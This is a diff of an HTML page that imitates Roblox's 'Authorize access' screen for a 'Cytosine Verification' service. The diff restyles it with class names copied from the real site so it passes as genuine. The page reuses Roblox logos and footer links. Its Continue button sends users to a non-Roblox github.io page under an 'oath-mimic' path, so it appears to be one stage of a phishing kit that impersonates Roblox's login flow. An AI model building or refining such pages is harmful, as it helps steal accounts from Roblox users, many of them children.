@@ -5,148 +5,166 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Authorize access - Roblox</title>
 <link rel="icon" href="https://authorize.roblox.com/assets/favicon.ico" />
-
 <style>
-  html {
-    -webkit-font-smoothing: antialiased;
+  /* Reset */
+  * {
     box-sizing: border-box;
-    text-size-adjust: 100%;
-    color-scheme: dark;
   }
-
-  *, ::before, ::after {
-    box-sizing: inherit;
-  }
-
   body {
-    margin: 0;
-    color: rgb(255, 255, 255);
-    font-family: "Builder Sans", Helvetica, Arial, sans-serif;
-    font-weight: 300;
-    font-style: normal;
-    font-size: 16px;
-    line-height: 140%;
-    background-color: rgb(17, 18, 22);
+    margin: 0; padding: 0;
+    background-color: #111216;
+    color: #fff;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
   }
-
-  .css-geyuby-Typography-root-Typography-h3-title {
-    margin: 0;
-    letter-spacing: inherit;
-    color: inherit;
-    text-decoration: none;
-    font-family: "Builder Sans", Helvetica, Arial, sans-serif;
-    font-weight: 800;
-    font-style: normal;
-    font-size: 24px;
-    line-height: 135%;
+  img {
     display: block;
-    text-align: center;
-    padding: 24px 0;
+    max-width: 100%;
   }
-
-  header {
-    padding: 16px 24px;
-    text-align: left;
+  /* MUI Grid and container mimics */
+  .MuiGrid-root {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: flex-start;
   }
-
-  header img {
-    width: 195px;
-    height: 35px;
-    display: block;
+  .MuiGrid-container {
+    gap: 12px;
   }
-
-  .account-box {
-    max-width: 360px;
+  .MuiGrid-direction-xs-column {
+    flex-direction: column;
+  }
+  .MuiGrid-item {
+    flex-grow: 1;
+  }
+  .MuiContainer-root {
+    width: 100%;
+    max-width: 960px;
     margin: 0 auto;
-    text-align: center;
+    padding: 24px 16px;
   }
 
-  .account-box span {
-    display: block;
+  /* Header */
+  header {
+    padding: 16px 16px 16px 16px;
+    display: flex;
+    justify-content: flex-start; /* Align left */
+  }
+
+  /* Title */
+  .MuiTypography-root {
+    color: #fff;
+  }
+  .css-geyuby-Typography-root-Typography-h3-title {
+    font-size: 1.5rem;
+    font-weight: 600;
     margin-bottom: 12px;
+    text-align: center;
+  }
+  /* Divider */
+  .MuiDivider-root {
+    border: none;
+    border-top: 1px solid #444;
+    margin-bottom: 16px;
+    width: 100%;
+  }
+
+  /* Account confirmation content */
+  .css-balliy-Grid-root-content-accountConfirmContent {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* Text "You're logged in as" */
+  .css-wkkm27-Typography-root-Typography-body1-Typography-colorPrimary-description {
     font-size: 1rem;
+    margin-bottom: 8px;
     color: #bbb;
   }
 
-  .avatar {
+  /* Avatar */
+  .MuiAvatar-root {
+    border-radius: 50%;
+    overflow: hidden;
     width: 80px;
     height: 80px;
-    border-radius: 50%;
-    margin: 0 auto 12px auto;
-    display: block;
+    margin-bottom: 8px;
+  }
+  .MuiAvatar-img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
   }
 
-  .username {
+  /* Username */
+  .css-tuz62m-Typography-root-Typography-largeLabel2-avatarCaption {
     font-weight: 700;
     font-size: 1.125rem;
     margin-bottom: 24px;
   }
 
+  /* Buttons */
   button {
-    font-family: "Builder Sans", Helvetica, Arial, sans-serif;
-    font-weight: 800;
-    font-size: 16px;
+    font-family: inherit;
+    font-weight: 600;
+    font-size: 1rem;
+    cursor: pointer;
+    border-radius: 8px;
     width: 100%;
     max-width: 360px;
     padding: 12px 0;
-    border-radius: 8px;
-    cursor: pointer;
-    user-select: none;
-    border: none;
     margin-bottom: 16px;
+    border: none;
     display: inline-flex;
-    justify-content: center;
     align-items: center;
+    justify-content: center;
+    user-select: none;
+    position: relative;
   }
 
-  .btn-continue {
+  .MuiButton-containedSecondary {
     background-color: #e5e5e6;
-    color: rgb(17, 18, 22);
+    color: #111216;
+    border: none;
     transition: background-color 0.3s ease;
   }
-
-  .btn-continue:hover {
+  .MuiButton-containedSecondary:hover {
     background-color: #cacaca;
   }
 
-  .btn-change {
+  .MuiButton-outlinedSecondary {
     background-color: transparent;
-    border: 2px solid #e5e5e6;
     color: #e5e5e6;
+    border: 2px solid #e5e5e6;
     transition: background-color 0.3s ease, color 0.3s ease;
   }
-
-  .btn-change:hover {
+  .MuiButton-outlinedSecondary:hover {
     background-color: #e5e5e6;
-    color: rgb(17, 18, 22);
+    color: #111216;
   }
 
-  .divider-or {
+  /* Divider "or" */
+  .css-cwl6yn-container {
     display: flex;
     align-items: center;
     max-width: 360px;
-    margin: 16px auto;
+    width: 100%;
+    margin-bottom: 16px;
+  }
+  .css-1eflhz3-border {
+    flex-grow: 1;
+    border-top: 1px solid #444;
+  }
+  .css-58077z-Typography-root-Typography-body2-content {
+    margin: 0 12px;
     color: #999;
     font-size: 0.875rem;
   }
 
-  .divider-or::before,
-  .divider-or::after {
-    content: "";
-    flex-grow: 1;
-    border-top: 1px solid #444;
-  }
-
-  .divider-or::before {
-    margin-right: 12px;
-  }
-
-  .divider-or::after {
-    margin-left: 12px;
-  }
-
+  /* Footer styling */
   footer {
-    background-color: rgb(17, 18, 22);
+    background-color: #111216;
     padding: 24px 16px;
     margin-top: 48px;
     color: #777;
@@ -154,34 +172,27 @@
     text-align: center;
   }
 
-  footer .footer-content {
+  .footer-content {
     max-width: 960px;
     margin: 0 auto;
   }
 
-  footer .footer-logo img {
-    width: 124px;
-    height: 21.52px;
-    margin: 0 auto 12px auto;
-    display: block;
-  }
-
-  footer nav {
-    display: flex;
-    justify-content: center;
-    flex-wrap: wrap;
-    gap: 8px;
+  .footer-logo {
     margin-bottom: 12px;
   }
 
-  footer nav a {
-    color: #999;
-    text-decoration: none;
+  .footer-nav {
+    margin-bottom: 12px;
     font-size: 0.875rem;
-    white-space: nowrap;
   }
 
-  footer nav a:hover {
+  .footer-nav a {
+    color: #999;
+    text-decoration: none;
+    margin: 0 4px;
+  }
+
+  .footer-nav a:hover {
     text-decoration: underline;
     color: #ccc;
   }
@@ -189,73 +200,83 @@
   .link-divider {
     color: #666;
     user-select: none;
-    padding: 0 6px;
+    padding: 0 4px;
   }
 </style>
 </head>
 <body>
-  <header>
-    <img
-      src="https://authorize.roblox.com/assets/logo/global_logo_white.svg"
-      alt="Roblox logo"
-      width="195"
-      height="35"
-    />
-  </header>
-
-  <main>
-    <div class="css-geyuby-Typography-root-Typography-h3-title">
-      Select Account to Continue to Cytosine Verification
-    </div>
-
-    <div class="account-box">
-      <span>You’re logged in as</span>
-      <img
-        class="avatar"
-        src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-95958C2AF5E21A0C93AD09DA0C40A7B1-Png/150/150/AvatarHeadshot/Png/noFilter"
-        alt="DERP5034"
-      />
-      <div class="username">thuggernaut</div>
-
-      <button
-        class="btn-continue"
-        type="button"
-        onclick="window.location.href='https://wemovewemovewemove.github.io/oath-mimic/auth-step2.html'"
-      >
-        Continue
-      </button>
-
-      <div class="divider-or">or</div>
-
-      <button class="btn-change" type="button">Change Account</button>
-    </div>
-  </main>
-
-  <footer>
-    <div class="footer-content">
-      <div class="footer-logo">
-        <img
-          src="https://authorize.roblox.com/assets/logo/global_logo_white.svg"
-          alt="Roblox logo"
-          width="124"
-          height="21.52"
-        />
+  <div class="MuiGrid-root MuiGrid-container MuiGrid-direction-xs-column css-rxt98s-Grid-root-root">
+    <header>
+      <div class="MuiGrid-root MuiGrid-container css-18os4ut-Grid-root-navigation" style="width: auto;">
+        <div class="MuiGrid-root MuiGrid-item css-qnt22k-Grid-root">
+          <img src="https://authorize.roblox.com/assets/logo/global_logo_white.svg" width="195" height="35" alt="logo" />
+        </div>
       </div>
-      <nav>
-        <a href="https://corp.roblox.com/" target="_blank" rel="noopener noreferrer">About Us</a>
-        <span class="link-divider">|</span>
-        <a href="https://corp.roblox.com/careers/" target="_blank" rel="noopener noreferrer">Join Us</a>
-        <span class="link-divider">|</span>
-        <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank" rel="noopener noreferrer">Terms</a>
-        <span class="link-divider">|</span>
-        <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-" target="_blank" rel="noopener noreferrer">Privacy</a>
-        <span class="link-divider">|</span>
-        <a href="https://www.roblox.com/info/accessibility" target="_blank" rel="noopener noreferrer">Accessibility</a>
-      </nav>
-      <div>
-        ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+    </header>
+
+    <main class="MuiContainer-root MuiContainer-maxWidthLg css-175a31o-main" style="padding: 0 16px;">
+      <span class="MuiTypography-root MuiTypography-inherit css-geyuby-Typography-root-Typography-h3-title">
+        Select Account to Continue to Cytosine Verification
+      </span>
+      <hr class="MuiDivider-root MuiDivider-fullWidth css-ah8i9v-Divider-root-divider" />
+
+      <div class="MuiGrid-root css-balliy-Grid-root-content-accountConfirmContent">
+        <span class="MuiTypography-root MuiTypography-inherit css-wkkm27-Typography-root-Typography-body1-Typography-colorPrimary-description">
+          You’re logged in as
+        </span>
+
+        <div class="MuiAvatar-root MuiAvatar-circular css-ssfh3z-avatar">
+          <img alt="DERP5034" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-95958C2AF5E21A0C93AD09DA0C40A7B1-Png/150/150/AvatarHeadshot/Png/noFilter" class="MuiAvatar-img css-1hy9t21" />
+        </div>
+
+        <span class="MuiTypography-root MuiTypography-inherit css-tuz62m-Typography-root-Typography-largeLabel2-avatarCaption">
+          thuggernaut
+        </span>
+
+        <button
+          onclick="window.location.href='https://wemovewemovewemove.github.io/oath-mimic/auth-step2.html'"
+          class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSecondary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth css-n1rgqe-Typography-buttonMedium-Button-contained-Typography-button-Typography-buttonMedium-Button-contained-operationButton"
+          type="button"
+        >
+          Continue<span class="MuiTouchRipple-root css-w0pj6f"></span>
+        </button>
+
+        <div class="css-cwl6yn-container css-xikqqy-divider">
+          <div class="css-1eflhz3-border"></div>
+          <span class="MuiTypography-root MuiTypography-inherit css-58077z-Typography-root-Typography-body2-content">or</span>
+          <div class="css-1eflhz3-border"></div>
+        </div>
+
+        <button
+          class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedSecondary MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-fullWidth css-9ipsbm-Typography-buttonMedium-Button-outlined-Typography-button-Typography-buttonMedium-Button-outlined-root"
+          type="button"
+        >
+          Change Account<span class="MuiTouchRipple-root css-w0pj6f"></span>
+        </button>
       </div>
-    </div>
-  </footer>
+    </main>
+
+    <footer>
+      <div class="footer-content">
+        <div class="footer-logo">
+          <img src="https://authorize.roblox.com/assets/logo/global_logo_white.svg" alt="Roblox logo" width="124" height="21.52" />
+        </div>
+        <nav class="footer-nav">
+          <a href="https://corp.roblox.com/" target="_blank" rel="noopener noreferrer">About Us</a>
+          <span class="link-divider">|</span>
+          <a href="https://corp.roblox.com/careers/" target="_blank" rel="noopener noreferrer">Join Us</a>
+          <span class="link-divider">|</span>
+          <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank" rel="noopener noreferrer">Terms</a>
+          <span class="link-divider">|</span>
+          <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-" target="_blank" rel="noopener noreferrer">Privacy</a>
+          <span class="link-divider">|</span>
+          <a href="https://www.roblox.com/info/accessibility" target="_blank" rel="noopener noreferrer">Accessibility</a>
+        </nav>
+        <div class="footer-copyright">
+          ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+      </div>
+    </footer>
+  </div>
 </body>
 </html>
